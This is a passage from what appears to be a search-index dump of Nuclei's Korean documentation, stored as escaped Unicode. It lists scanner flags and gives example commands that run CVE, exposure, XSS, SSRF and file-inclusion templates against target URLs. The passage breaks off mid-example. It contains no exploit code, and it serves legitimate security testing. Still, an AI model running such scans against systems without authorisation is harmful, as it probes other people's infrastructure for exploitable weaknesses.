\ubaa9\ub85d\uc774 \ud3ec\ud568\ub41c \ud30c\uc77c \uacbd\ub85c(\uc904\ub2f9 \ud558\ub098\uc529) -resume string resume.cfg\ub97c \uc0ac\uc6a9\ud55c \uc2a4\uce94 \uc7ac\uac1c(\ud074\ub7ec\uc2a4\ud130\ub9c1\uc774 \ube44\ud65c\uc131\ud654\ub428) TEMPLATES: -nt, -new-templates nuclei-templates\uc5d0 \uac00\uc7a5 \ucd5c\uadfc\uc5d0 \ucd94\uac00\ub41c \uc0c8 \ud15c\ud50c\ub9bf\ub9cc \uc2e4\ud589 -as, -automatic-scan \ud0dc\uadf8 \ub9e4\ud551\uc5d0 \ub300\ud55c wappalyzer \uae30\uc220 \ud0d0\uc9c0\ub97c \uc0ac\uc6a9\ud55c \uc790\ub3d9 \uc6f9 \uc2a4\uce94 -t, -templates string[] \uc2e4\ud589\ud560 \ud15c\ud50c\ub9bf \ub610\ub294 \ud15c\ud50c\ub9bf \ub514\ub809\ud130\ub9ac \ubaa9\ub85d(\uc27c\ud45c\ub85c \uad6c\ubd84\ub41c \ud30c\uc77c) -tu, -template-url string[] \uc2e4\ud589\ud560 \ud15c\ud50c\ub9bf URL \ubaa9\ub85d(\uc27c\ud45c\ub85c \uad6c\ubd84\ub41c \ud30c\uc77c) -w, -workflows string[] \uc2e4\ud589\ud560 \uc6cc\ud06c\ud50c\ub85c \ub610\ub294 \uc6cc\ud06c\ud50c\ub85c \ub514\ub809\ud130\ub9ac \ubaa9\ub85d(\uc27c\ud45c\ub85c \uad6c\ubd84\ub41c \ud30c\uc77c) -wu, -workflow-url string[] \uc2e4\ud589\ud560 \uc6cc\ud06c\ud50c\ub85c URL \ubaa9\ub85d(\uc27c\ud45c\ub85c \uad6c\ubd84\ub41c \ud30c\uc77c) -validate nuclei\ub85c \uc804\ub2ec\ub41c \ud15c\ud50c\ub9bf \uac80\uc99d -tl \uc0ac\uc6a9 \uac00\ub2a5\ud55c \ubaa8\ub4e0 \ud15c\ud50c\ub9bf \ubaa9\ub85d FILTERING: -a, -author string[] \uc791\uc131\uc790\ub97c \uae30\uc900\uc73c\ub85c \uc2e4\ud589\ud560 \ud15c\ud50c\ub9bf(\uc27c\ud45c\ub85c \uad6c\ubd84\ub41c \ud30c\uc77c) -tags string[] \ud0dc\uadf8\ub97c \uae30\uc900\uc73c\ub85c \uc2e4\ud589\ud560 \ud15c\ud50c\ub9bf(\uc27c\ud45c\ub85c \uad6c\ubd84\ub41c \ud30c\uc77c) -etags, -exclude-tags string[] \ud0dc\uadf8\ub97c \uae30\uc900\uc73c\ub85c \uc81c\uc678\ud560 \ud15c\ud50c\ub9bf(\uc27c\ud45c\ub85c \uad6c\ubd84\ub41c \ud30c\uc77c) -itags, -include-tags string[] \ud0dc\uadf8\uac00 \uae30\ubcf8 \ub610\ub294 \uad6c\uc131\uc5d0 \uc758\ud574 \uc81c\uc678\ub41c \uacbd\uc6b0\uc5d0\ub3c4 \uc2e4\ud589\ub428 -id, -template-id string[] \ud15c\ud50c\ub9bf ID\ub4e4\uc744 \uae30\uc900\uc73c\ub85c \uc2e4\ud589\ud560 \ud15c\ud50c\ub9bf(\uc27c\ud45c\ub85c \uad6c\ubd84\ub41c \ud30c\uc77c) -eid, -exclude-id string[] \ud15c\ud50c\ub9bf ID\ub4e4\uc744 \uae30\uc900\uc73c\ub85c \uc81c\uc678\ud560 \ud15c\ud50c\ub9bf(\uc27c\ud45c\ub85c \uad6c\ubd84\ub41c \ud30c\uc77c) -it, -include-templates string[] \ud15c\ud50c\ub9bf\uc774 \uae30\ubcf8 \ub610\ub294 \uad6c\uc131\uc5d0 \uc758\ud574 \uc81c\uc678\ub41c \uacbd\uc6b0\uc5d0\ub3c4 \uc2e4\ud589\ub428 -et, -exclude-templates string[] \uc81c\uc678\ud560 \ud15c\ud50c\ub9bf \ub610\ub294 \ud15c\ud50c\ub9bf \ub514\ub809\ud130\ub9ac(\ud30c\uc77c\ub85c \uad6c\ubd84\ub428, \ud30c\uc77c) -s, -severity value[] \uc2ec\uac01\ub3c4\ub97c \uae30\uc900\uc73c\ub85c \uc2e4\ud589\ud560 \ud15c\ud50c\ub9bf. \uac00\ub2a5\ud55c \uac12: info, low, medium, high, critical, unknown -es, -exclude-severity value[] \uc2ec\uac01\ub3c4\ub97c \uae30\uc900\uc73c\ub85c \uc81c\uc678\ud560 \ud15c\ud50c\ub9bf. \uac00\ub2a5\ud55c \uac12: info, low, medium, high, critical, unknown -pt, -type value[] \ud504\ub85c\ud1a0\ucf5c \uc720\ud615\uc744 \uae30\uc900\uc73c\ub85c \uc2e4\ud589\ud560 \ud15c\ud50c\ub9bf. \uac00\ub2a5\ud55c \uac12: dns, file, http, headless, network, workflow, ssl, websocket, whois -ept, -exclude-type value[] \ud504\ub85c\ud1a0\ucf5c \uc720\ud615\uc5d0 \ub530\ub77c \uc81c\uc678\ud560 \ud15c\ud50c\ub9bf. \uac00\ub2a5\ud55c \uac12: dns, file, http, headless, network, workflow, ssl, websocket, whois OUTPUT: -o, -output string \ubc1c\uacac\ub41c \ubb38\uc81c/\ucde8\uc57d\uc810\ub97c \uc4f0\uae30 \uc704\ud55c \ucd9c\ub825 \ud30c\uc77c -sresp, -store-resp nuclei\uc744 \ud1b5\ud574 \uc804\ub2ec\ub41c \ubaa8\ub4e0 \uc694\uccad/\uc751\ub2f5\uc744 \ucd9c\ub825 \ub514\ub809\ud130\ub9ac\uc5d0 \uc800\uc7a5 -srd, -store-resp-dir string nuclei\uc744 \ud1b5\ud574 \uc804\ub2ec\ub41c \ubaa8\ub4e0 \uc694\uccad/\uc751\ub2f5\uc744 \uc0ac\uc6a9\uc790 \uc9c0\uc815 \ub514\ub809\ud130\ub9ac\uc5d0 \uc800\uc7a5(\uae30\ubcf8 \"output\") -silent \uacb0\uacfc\ub9cc \ud45c\uc2dc -nc, -no-color \ucd9c\ub825 \ub0b4\uc6a9 \uc0c9\uc0c1 \ube44\ud65c\uc131\ud654 (ANSI escape codes) -json JSONL(ines) \ud615\uc2dd\uc73c\ub85c \ucd9c\ub825 -irr, -include-rr JSONL \ucd9c\ub825\uc5d0 \uc694\uccad/\uc751\ub2f5 \uc30d \ud3ec\ud568(\uacb0\uacfc\ub9cc) -nm, -no-meta cli \ucd9c\ub825\uc5d0\uc11c \uacb0\uacfc \uba54\ud0c0\ub370\uc774\ud130 \ucd9c\ub825 \ube44\ud65c\uc131\ud654 -nts, -no-timestamp cli \ucd9c\ub825\uc5d0\uc11c \uacb0\uacfc \ud0c0\uc784\uc2a4\ud0ec\ud504 \ucd9c\ub825 \ube44\ud65c\uc131\ud654 -rdb, -report-db string nuclei \ubcf4\uace0 \ub370\uc774\ud130\ubca0\uc774\uc2a4(\ubcf4\uace0\uc11c \ub370\uc774\ud130\ub97c \uc720\uc9c0\ud558\ub824\uba74 \ud56d\uc0c1 \uc774\uac83\uc744 \uc0ac\uc6a9) -ms, -matcher-status \ub9e4\uce58 \uc2e4\ud328 \uc0c1\ud0dc \ud45c\uc2dc -me, -markdown-export string \ub9c8\ud06c\ub2e4\uc6b4 \ud615\uc2dd\uc73c\ub85c \uacb0\uacfc\ub97c \ub0b4\ubcf4\ub0bc \ub514\ub809\ud130\ub9ac -se, -sarif-export string \uacb0\uacfc\ub97c SARIF \ud615\uc2dd\uc73c\ub85c \ub0b4\ubcf4\ub0b4\ub294 \ud30c\uc77c CONFIGURATIONS: -config string nuclei \ud658\uacbd \uc124\uc815 \ud30c\uc77c \uacbd\ub85c -fr, -follow-redirects http \ud15c\ud50c\ub9bf\uc5d0 following redirects \ud65c\uc131\ud654 -mr, -max-redirects int http \ud15c\ud50c\ub9bf\uc5d0 \ub530\ub77c\uc57c \ud560 \ucd5c\ub300 \ub9ac\ub514\ub809\uc158 \uc218(\uae30\ubcf8\uac12 10) -dr, -disable-redirects http \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud55c \ub9ac\ub514\ub809\uc158 \ube44\ud65c\uc131\ud654 -rc, -report-config string nuclei \ubcf4\uace0 \ubaa8\ub4c8 \ud658\uacbd \uc124\uc815 \ud30c\uc77c -H, -header string[] \ud5e4\ub354:\uac12 \ud615\uc2dd\uc758 \ubaa8\ub4e0 http \uc694\uccad\uc5d0 \ud3ec\ud568\ud560 \uc0ac\uc6a9\uc790 \uc815\uc758 \ud5e4\ub354/\ucfe0\ud0a4(cli, file) -V, -var value \ud0a4=\uac12 \ud615\uc2dd\uc758 \uc0ac\uc6a9\uc790 \uc815\uc758 \ubcc0\uc218 -r, -resolvers string nuclei\uc5d0 \ub300\ud55c \ub9ac\uc878\ubc84 \ubaa9\ub85d\uc774 \ud3ec\ud568\ub41c \ud30c\uc77c -sr, -system-resolvers \uc5d0\ub7ec fallback\uc73c\ub85c \uc2dc\uc2a4\ud15c DNS \ub9ac\uc878\ube59 \uc0ac\uc6a9 -passive \uc218\ub3d9 HTTP \uc751\ub2f5 \ucc98\ub9ac \ubaa8\ub4dc \ud65c\uc131\ud654 -ev, -env-vars \ud15c\ud50c\ub9bf\uc5d0\uc11c \ud658\uacbd \ubcc0\uc218\ub97c \uc0ac\uc6a9\ud560 \uc218 \uc788\ub3c4\ub85d \uc124\uc815 -cc, -client-cert string \uc2a4\uce94\ub41c \ud638\uc2a4\ud2b8\uc5d0 \uc778\uc99d\ud558\ub294 \ub370 \uc0ac\uc6a9\ub418\ub294 \ud074\ub77c\uc774\uc5b8\ud2b8 \uc778\uc99d\uc11c \ud30c\uc77c(PEM-encoded) -ck, -client-key string \uc2a4\uce94\ub41c \ud638\uc2a4\ud2b8\uc5d0 \uc778\uc99d\ud558\ub294 \ub370 \uc0ac\uc6a9\ub418\ub294 \ud074\ub77c\uc774\uc5b8\ud2b8 key \ud30c\uc77c(PEM-encoded) -ca, -client-ca string \uc2a4\uce94\ub41c \ud638\uc2a4\ud2b8\uc5d0 \uc778\uc99d\ud558\ub294 \ub370 \uc0ac\uc6a9\ub418\ub294 \ud074\ub77c\uc774\uc5b8\ud2b8 \uc778\uc99d \uae30\uad00 \ud30c\uc77c(PEM-encoded) -sml, -show-match-line \ud30c\uc77c \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud574 \uc77c\uce58\ud558\ub294 \uc904 \ud45c\uc2dc, extractors\uc5d0\uc11c\ub9cc \uc791\ub3d9 -ztls tls13\uc758 \ud45c\uc900\uc73c\ub85c autofallback\uacfc \ud568\uaed8 ztls \ub77c\uc774\ube0c\ub7ec\ub9ac \uc0ac\uc6a9 -sni string \uc0ac\uc6a9\ud560 tls sni \ud638\uc2a4\ud2b8 \uc774\ub984(\uae30\ubcf8: \uc785\ub825\ud55c \ub3c4\uba54\uc778 \uc774\ub984) INTERACTSH: -iserver, -interactsh-server string \uc790\uccb4 \ud638\uc2a4\ud305\ub41c \uc778\uc2a4\ud134\uc2a4\uc5d0 \ub300\ud55c interactsh \uc11c\ubc84 URL (\uae30\ubcf8: oast.pro,oast.live,oast.site,oast.online,oast.fun,oast.me) -itoken, -interactsh-token string \uc790\uccb4 \ud638\uc2a4\ud305\ub41c interactsh \uc11c\ubc84\uc5d0 \ub300\ud55c \uc778\uc99d \ud1a0\ud070 -interactions-cache-size int \uc0c1\ud638 \uc791\uc6a9 \uce90\uc2dc\uc5d0 \uc720\uc9c0\ud560 \uc694\uccad \uc218 (\uae30\ubcf8 5000) -interactions-eviction int \uce90\uc2dc\uc5d0\uc11c \uc694\uccad\uc744 \uc81c\uac70\ud558\uae30 \uc804\uc5d0 \ub300\uae30\ud560 \uc2dc\uac04(\ucd08) (\uae30\ubcf8 60) -interactions-poll-duration int \uac01 \uc0c1\ud638 \uc791\uc6a9 \ud3f4\ub9c1 \uc694\uccad \uc804\uc5d0 \ub300\uae30\ud560 \uc2dc\uac04(\ucd08) (\uae30\ubcf8 5) -interactions-cooldown-period int \uc885\ub8cc \uc804 \uc0c1\ud638\uc791\uc6a9 \ud3f4\ub9c1\uc744 \uc704\ud55c \ucd94\uac00 \uc2dc\uac04 (\uae30\ubcf8 5) -ni, -no-interactsh OAST \ud14c\uc2a4\ud2b8\ub97c \uc704\ud574 interactsh \uc11c\ubc84 \ube44\ud65c\uc131\ud654, OAST \uae30\ubc18 \ud15c\ud50c\ub9bf \uc81c\uc678 RATE-LIMIT: -rl, -rate-limit int \ucd08\ub2f9 \ubcf4\ub0bc \ucd5c\ub300 \uc694\uccad \uc218 (\uae30\ubcf8 150) -rlm, -rate-limit-minute int \ubd84\ub2f9 \ubcf4\ub0bc \ucd5c\ub300 \uc694\uccad \uc218 -bs, -bulk-size int \ud15c\ud50c\ub9bf\ub2f9 \ubcd1\ub82c\ub85c \ubd84\uc11d\ud560 \ucd5c\ub300 \ud638\uc2a4\ud2b8 \uc218 (\uae30\ubcf8 25) -c, -concurrency int \ubcd1\ub82c\ub85c \uc2e4\ud589\ud560 \ucd5c\ub300 \ud15c\ud50c\ub9bf \uc218 (\uae30\ubcf8 25) -hbs, -headless-bulk-size int \ud15c\ud50c\ub9bf\ub2f9 \ubcd1\ub82c\ub85c \ubd84\uc11d\ud560 \ucd5c\ub300 headless \ud638\uc2a4\ud2b8 \uc218 (\uae30\ubcf8 10) -hc, -headless-concurrency int \ubcd1\ub82c\ub85c \uc2e4\ud589\ud560 \ucd5c\ub300 headless \ud15c\ud50c\ub9bf \uc218 (\uae30\ubcf8 10) OPTIMIZATIONS: -timeout int \ud0c0\uc784\uc544\uc6c3 \uc804 \ub300\uae30 \uc2dc\uac04(\ucd08) (\uae30\ubcf8 5) -retries int \uc2e4\ud328\ud55c \uc694\uccad\uc744 \uc7ac\uc2dc\ub3c4\ud558\ub294 \ud69f\uc218 (\uae30\ubcf8 1) -ldp, -leave-default-ports leave default HTTP/HTTPS ports (eg. host:80,host:443 -mhe, -max-host-error int \uc2a4\uce94\uc744 \uac74\ub108\ub6f0\uae30 \uc804\uc5d0 \ud638\uc2a4\ud2b8\uc5d0 \ub300\ud55c \ucd5c\ub300 \uc624\ub958 \uc218 (\uae30\ubcf8 30) -nmhe, -no-mhe disable skipping host from scan based on errors -project \ud504\ub85c\uc81d\ud2b8 \ud3f4\ub354\ub97c \uc0ac\uc6a9\ud558\uc5ec \ub3d9\uc77c\ud55c \uc694\uccad\uc744 \uc5ec\ub7ec \ubc88 \ubcf4\ub0b4\uc9c0 \uc54a\uc74c -project-path string \ud2b9\uc815 \ud504\ub85c\uc81d\ud2b8 \uacbd\ub85c \uc124\uc815 -spm, -stop-at-first-path \uccab \ubc88\uc9f8 \uc77c\uce58 \ud6c4 HTTP \uc694\uccad \ucc98\ub9ac \uc911\uc9c0 (template/workflow \ub85c\uc9c1\uc774 \uc911\ub2e8\ub420 \uc218 \uc788\uc74c) -stream stream \ubaa8\ub4dc - \uc785\ub825\uc744 \uc815\ub82c\ud558\uc9c0 \uc54a\uace0 elaborating \uc2dc\uc791 HEADLESS: -headless \ud5e4\ub4dc\ub9ac\uc2a4 \ube0c\ub77c\uc6b0\uc800 \uc9c0\uc6d0\uc774 \ud544\uc694\ud55c \ud15c\ud50c\ub9bf \ud65c\uc131\ud654(root user on linux will disable sandbox) -page-timeout int \ud5e4\ub4dc\ub9ac\uc2a4 \ubaa8\ub4dc\uc5d0\uc11c \uac01 \ud398\uc774\uc9c0\ub97c \uae30\ub2e4\ub9ac\ub294 \uc2dc\uac04(\ucd08)(\uae30\ubcf8 20) -sb, -show-browser \ud5e4\ub4dc\ub9ac\uc2a4 \ubaa8\ub4dc\ub85c \ud15c\ud50c\ub9bf\uc744 \uc2e4\ud589\ud560 \ub54c \ud654\uba74\uc5d0 \ube0c\ub77c\uc6b0\uc800 \ud45c\uc2dc -sc, -system-chrome \uc124\uce58\ub41c nuclei \ub300\uc2e0 \ub85c\uceec\uc5d0 \uc124\uce58\ub41c chrome \ube0c\ub77c\uc6b0\uc800 \uc0ac\uc6a9 DEBUG: -debug \ubaa8\ub4e0 \uc694\uccad \ubc0f \uc751\ub2f5 \ud45c\uc2dc -dreq, -debug-req \ubcf4\ub0b8 \ubaa8\ub4e0 \uc694\uccad \ud45c\uc2dc -dresp, -debug-resp \ubc1b\uc740 \ubaa8\ub4e0 \uc751\ub2f5 \ud45c\uc2dc -p, -proxy string[] \uc0ac\uc6a9\ud560 http/socks5 \ud504\ub85d\uc2dc \ubaa9\ub85d(\uc27c\ud45c\ub85c \uad6c\ubd84\ud558\uac70\ub098 \ud30c\uc77c \uc785\ub825) -pi, -proxy-internal \ubaa8\ub4e0 \ub0b4\ubd80 \uc694\uccad\uc744 \ud504\ub85d\uc2dc -tlog, -trace-log string \ubcf4\ub0b8 \uc694\uccad \ucd94\uc801 \ub85c\uadf8\ub97c \uae30\ub85d\ud560 \ud30c\uc77c -elog, -error-log string \ubcf4\ub0b8 \uc694\uccad \uc624\ub958 \ub85c\uadf8\ub97c \uae30\ub85d\ud560 \ud30c\uc77c -version nuclei \ubc84\uc804 \ucd9c\ub825 -hm, -hang-monitor nuclei hang monitoring \ud65c\uc131\ud654 -v, -verbose \uc0c1\uc138 \ucd9c\ub825 \ud45c\uc2dc -vv \uc2a4\uce94\uc744 \uc704\ud574 \ub85c\ub4dc\ub41c \ub514\uc2a4\ud50c\ub808\uc774 \ud15c\ud50c\ub9bf \ud45c\uc2dc -ep, -enable-pprof pprof debugging server \ud65c\uc131\ud654 -tv, -templates-version \uc124\uce58\ub41c nuclei-templates \ubc84\uc804 \ucd9c\ub825 UPDATE: -update \ucd5c\uc2e0 \ub9b4\ub9ac\uc2a4 \ubc84\uc804\uc73c\ub85c nuclei \uc5d4\uc9c4 \uc5c5\ub370\uc774\ud2b8 -ut, -update-templates \ucd5c\uc2e0 \ub9b4\ub9ac\uc2a4 \ubc84\uc804\uc73c\ub85c nuclei-templates \uc5d4\uc9c4 \uc5c5\ub370\uc774\ud2b8 -ud, -update-directory string nuclei-templates\ub97c \uc124\uce58\ud560 \uae30\ubcf8 \ub514\ub809\ud130\ub9ac\ub97c \ub36e\uc5b4\uc500 -duc, -disable-update-check \uc790\ub3d9 nuclei/templates \uc5c5\ub370\uc774\ud2b8 \ud655\uc778 \ube44\ud65c\uc131\ud654 STATISTICS: -stats \uc2e4\ud589 \uc911\uc778 \uc2a4\uce94\uc5d0 \ub300\ud55c \ud1b5\uacc4 \ud45c\uc2dc -sj, -stats-json JSONL(ines) \ud615\uc2dd\uc73c\ub85c \ucd9c\ub825 \ud30c\uc77c\uc5d0 \ud1b5\uacc4 \ub370\uc774\ud130 \uc4f0\uae30 -si, -stats-interval int \ud1b5\uacc4 \uc5c5\ub370\uc774\ud2b8\ub97c \ud45c\uc2dc\ud560 \ub54c\uae4c\uc9c0 \ub300\uae30\ud558\ub294 \uc2dc\uac04(\ucd08) (\uae30\ubcf8 5) -m, -metrics \ud3ec\ud2b8(\uae30\ubcf8 9092)\uc5d0\uc11c \uc2e4\ud589 \uc911\uc778 scan matrics \ubcf4\uae30 -mp, -metrics-port int nuclei metrics \ud3ec\ud2b8 \uc124\uc815 (\uae30\ubcf8 9092)","title":"Nuclei \uc0ac\uc6a9\ubc95"},{"location":"kr/nuclei/get-started/#nuclei_4","text":"Nuclei \ud15c\ud50c\ub9bf\uc740 \ud06c\uac8c \ub450 \uac00\uc9c0 \ubc29\ubc95\uc73c\ub85c \uc2e4\ud589 \ub420 \uc218 \uc788\uc2b5\ub2c8\ub2e4. 1) Templates ( -t/templates ) \uae30\ubcf8\uc801\uc73c\ub85c, \ubaa8\ub4e0 \ud15c\ud50c\ub9bf (nuclei-ignore \ub9ac\uc2a4\ud2b8\ub97c \uc81c\uc678\ud55c) \ub4e4\uc740 \uae30\ubcf8 \ud15c\ud50c\ub9bf \uc124\uce58 \uacbd\ub85c\uc5d0\uc11c \uc2e4\ud589\ub429\ub2c8\ub2e4. nuclei -u https://example.com \ubcc4\ub3c4\uc758 \ud15c\ud50c\ub9bf \ud3f4\ub354 \ud639\uc740 \ub2e4\uc218\uc758 \ud15c\ud50c\ub9bf \ud3f4\ub354\ub294 \ub2e4\uc74c\uacfc \uac19\uc774 \uc2e4\ud589\ub420 \uc218 \uc788\uc2b5\ub2c8\ub2e4. nuclei -u https://example.com -t cves/ -t exposures/ URL \ub9ac\uc2a4\ud2b8\uc5d0 \ub300\ud574\uc11c\ub3c4 \ud15c\ud50c\ub9bf\ub4e4\uc740 \uc2e4\ud589\ub420 \uc218 \uc788\uc2b5\ub2c8\ub2e4. nuclei -list http_urls.txt 2) Workflows ( -w/workflows ) nuclei -u https://example.com -w workflows/ URL \ub9ac\uc2a4\ud2b8\uc5d0 \ub300\ud574\uc11c\ub3c4 Workflows\ub4e4\uc740 \uc2e4\ud589\ub420 \uc218 \uc788\uc2b5\ub2c8\ub2e4. nuclei -list http_urls.txt -w workflows/wordpress-workflow.yaml","title":"Nuclei \uc2e4\ud589"},{"location":"kr/nuclei/get-started/#nuclei_5","text":"Nuclei \uc5d4\uc9c4\uc740 \ud15c\ud50c\ub9bf \uc2e4\ud589\uc744 \ucee4\uc2a4\ud140\ud558\uae30 \uc704\ud574\uc11c 3\uac1c\uc758 \uae30\ubcf8 \ud544\ud130\ub97c \uc81c\uacf5\ud569\ub2c8\ub2e4. Tags ( -tags ) \ud15c\ud50c\ub9bf\uc5d0\uc11c \uc0ac\uc6a9\uac00\ub2a5\ud55c \ud0dc\uadf8 \uc18d\uc131\uc5d0 \uae30\ubc18\ud55c \ud544\ud130 Severity ( -severity ) \ud15c\ud50c\ub9bf\uc5d0\uc11c \uc0ac\uc6a9\uac00\ub2a5\ud55c \uc2ec\uac01\ub3c4 \uc18d\uc131\uc5d0 \uae30\ubc18\ud55c \ud544\ud130 Author ( -author ) \ud15c\ud50c\ub9bf\uc5d0\uc11c \uc0ac\uc6a9\uac00\ub2a5\ud55c \uc791\uc131\uc790 \uc18d\uc131\uc5d0 \uae30\ubc18\ud55c \ud544\ud130 \uae30\ubcf8\uc801\uc73c\ub85c, \ud544\ud130\ub4e4\uc740 \ud15c\ud50c\ub9bf \uc124\uce58 \uacbd\ub85c\uc5d0 \uc801\uc6a9\ub418\uace0, \uc218\ub3d9 \ud15c\ud50c\ub9bf \uacbd\ub85c \uc785\ub825\uc744 \uc0ac\uc6a9\ud558\uc5ec \ucee4\uc2a4\ud140\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc608\ub97c \ub4e4\uc5b4, \uc544\ub798\uc758 \uba85\ub839\uc740 ~/nuclei-templates/ \ud3f4\ub354\uc5d0 \uc124\uce58\ub41c \ud15c\ud50c\ub9bf\ub4e4 \uc911\uc5d0\uc11c cve \ud0dc\uadf8\ub97c \uac00\uc9c4 \ud15c\ud50c\ub9bf\ub4e4\uc744 \uc2e4\ud589\uc2dc\ud0b5\ub2c8\ub2e4. nuclei -u https://example.com -tags cve \uadf8\ub9ac\uace0 \ub2e4\uc74c\uc740 ~/nuclei-templates/exposures/ \ud3f4\ub354\uc758 config \ud0dc\uadf8\ub97c \uac00\uc9c4 \ubaa8\ub4e0 \uc0ac\uc6a9\uac00\ub2a5\ud55c \ud15c\ud50c\ub9bf\ub4e4\uc744 \uc2e4\ud589\ud558\ub294 \uc608\uc785\ub2c8\ub2e4. nuclei -u https://example.com -tags config -t exposures/ \ub2e4\uc218\uc758 \ud544\ud130\ub97c AND \uc870\uac74\uc73c\ub85c \ud568\uaed8 \uc0ac\uc6a9\uc774 \uac00\ub2a5\ud569\ub2c8\ub2e4. \ub2e4\uc74c\uc740 cve \ud0dc\uadf8\ub97c \uac00\uc84c\uace0, critical \ub610\ub294 high \uc758 \uc2ec\uac01\ub3c4\ub97c \uac00\uc84c\uace0, \uc791\uc131\uc790\uac00 geeknik \uc778 \ubaa8\ub4e0 \ud15c\ud50c\ub9bf\uc744 \uc2e4\ud589\ud558\ub294 \uc608\uc785\ub2c8\ub2e4. nuclei -u https://example.com -tags cve -severity critical,high -author geeknik \ub2e4\uc218\uc758 \ud544\ud130\ub294 \ud15c\ud50c\ub9bf \uc870\uac74 \ud50c\ub798\uadf8 ( tc )\ub97c \uc774\uc6a9\ud574 \uc870\ud569\ud558\uc5ec \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ud15c\ud50c\ub9bf \uc870\uac74 \ud50c\ub798\uadf8\uc73c\ub85c \ub2e4\uc74c\uacfc \uac19\uc740 \ubcf5\uc7a1\ud55c \ud45c\ud604\uc2dd\uc744 \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. nuclei -tc \"contains(id,'xss') || contains(tags,'xss')\" nuclei -tc \"contains(tags,'cve') && contains(tags,'ssrf')\" nuclei -tc \"contains(name, 'Local File Inclusion')\" \ud544\ud130\ub9c1\uc744 \uc9c0\uc6d0\ud558\ub294 \uc18d\uc131 \ubaa9\ub85d\uc785\ub2c8\ub2e4. id string name string description string tags slice of strings authors slice of strings severity string protocol string http_method slice of strings body string (containing all request bodies if any) matcher_type slice of string extractor_type slice of string description string \ub610\ud55c, \ud15c\ud50c\ub9bf\uc758 \uba54\ud0c0\ub370\uc774\ud130 \uc601\uc5ed\uc758 \ud0a4-\uac12\uc73c\ub85c \uad6c\uc131\ub41c \ubaa8\ub4e0 \uc30d\uc774 \uac00\ub2a5\ud569\ub2c8\ub2e4. \ubaa8\ub4e0 \uc18d\uc131\ub4e4\uc740 \ub17c\ub9ac \uc5f0\uc0b0\uc790( || \uc640 && ) \ub97c \ud1b5\ud574 \uc870\ud569\ub420 \uc218 \uc788\uace0, DSL helper \ud568\uc218\ub4e4\uacfc \ud568\uaed8 \uc0ac\uc6a9\ub420 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ubaa8\ub4e0 \ud544\ud130\ub4e4\uc740 workflows \uc5d0\uc11c\ub3c4 \ub9c8\ucc2c\uac00\uc9c0\ub85c \uc9c0\uc6d0\ub429\ub2c8\ub2e4. nuclei -w workflows/wordpress-workflow.yaml -severity critical,high -list http_urls.txt Workflows Workflows\uc5d0\uc11c\ub294 Workflows\ub97c \ud1b5\ud574 \uc2e4\ud589\ub418\ub294 \ud15c\ud50c\ub9bf, \uc11c\ube0c\ud15c\ud50c\ub9bf\uc5d0 Nuclei \ud544\ud130\uac00 \uc801\uc6a9\ub429\ub2c8\ub2e4.","title":"Nuclei \ud544\ud130"},{"location":"kr/nuclei/get-started/#_1","text":"Nuclei\ub294 \ub2e4\uc591\ud55c \uc694\uc778\uc73c\ub85c \ub2e4\uc911 \uc18d\ub3c4 \uc81c\ud55c \uc81c\uc5b4\ub97c \ud569\ub2c8\ub2e4. \uc694\uc778\uc73c\ub85c\ub294 \ubcd1\ub82c\ub85c \uc2e4\ud589\ud560 \ud15c\ud50c\ub9bf \uc218, \uac01 \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud574 \ubcd1\ub82c\ub85c \uac80\uc0c9\ud560 \ud638\uc2a4\ud2b8 \uc218, Nuclei\ub97c \uc774\uc6a9\ud558\uc5ec \uc0dd\uc131\ud558\uac70\ub098 \uc81c\ud55c\ud558\uace0\uc790 \ud55c \ucd08\ub2f9 \ucd1d \uc694\uccad \uc218 \ub4f1\uc774 \uc788\uc2b5\ub2c8\ub2e4.\uc544\ub798\ub294 \uac01 \ud50c\ub798\uadf8\uc5d0 \ub300\ud55c \uc124\uba85\uc785\ub2c8\ub2e4. Flag Description rate-limit \ucd08\ub2f9 \ucd1d \uc694\uccad\uc758 \uc218\ub97c \uc81c\uc5b4\ud569\ub2c8\ub2e4. bulk-size \uac01 \ud15c\ud50c\ub9bf\ub9c8\ub2e4 \ub3d9\uc2dc\uc5d0 \uc9c4\ud589\ud560 \ud638\uc2a4\ud2b8\uc758 \uc218\ub97c \uc81c\uc5b4\ud569\ub2c8\ub2e4. c \ub3d9\uc2dc\uc5d0 \uc9c4\ud589\ud560 \ud15c\ud50c\ub9bf\uc758 \uc218\ub97c \uc81c\uc5b4\ud569\ub2c8\ub2e4. Nuclei\uc758 \uc18d\ub3c4 \uc81c\ud55c\uacfc \uc815\ud655\ub3c4\ub97c \uc774 \ud50c\ub798\uadf8\ub97c \uc774\uc6a9\ud558\uc5ec \uc790\uc720\ub86d\uac8c \uc870\uc815\ud558\uc138\uc694! Tip rate-limit \ud50c\ub798\uadf8\ub294 \ub2e4\ub978 \ub450 \ud50c\ub798\uadf8\ubcf4\ub2e4 \uc6b0\uc120\ud569\ub2c8\ub2e4. \ucd08\ub2f9 \uc694\uccad\uc758 \uc218\ub294 c \uc640 bulk-size \ud50c\ub798\uadf8 \uac12\uc5d0 \uc0c1\uad00\uc5c6\uc774 rate-limit \uac12\uc744 \ucd08\uacfc\ud560 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4.","title":"\uc18d\ub3c4 \uc81c\ud55c"},{"location":"kr/nuclei/get-started/#traffic-tagging","text":"\ub9ce\uc740 \ubc84\uadf8 \ubc14\uc6b4\ud2f0 \ud50c\ub7ab\ud3fc\uacfc \ud504\ub85c\uadf8\ub7a8\ub4e4\uc740 \uc2dd\ubcc4\uc744 \uc704\ud574 \uc5ec\ub7ec\ubd84\ub4e4\uc774 \uc0dd\uc131\ud55c HTTP \ud2b8\ub798\ud53d\uc744 \uc694\uad6c\ud569\ub2c8\ub2e4. \uc774\ub294 $HOME/.config/nuclei/config.yaml \uc758 \uc124\uc815 \ud30c\uc77c\uc744 \uc774\uc6a9\ud558\uac70\ub098 -H / header CLI \ud50c\ub798\uadf8\ub97c \uc774\uc6a9\ud558\uba74 \ub429\ub2c8\ub2e4. \uc124\uc815 \ud30c\uc77c\uc744 \uc774\uc6a9\ud55c \uc0ac\uc6a9\uc790 \uc815\uc758 \ud5e4\ub354 \uc124\uc815 # Headers to include with each request. header : - 'X-BugBounty-Hacker: 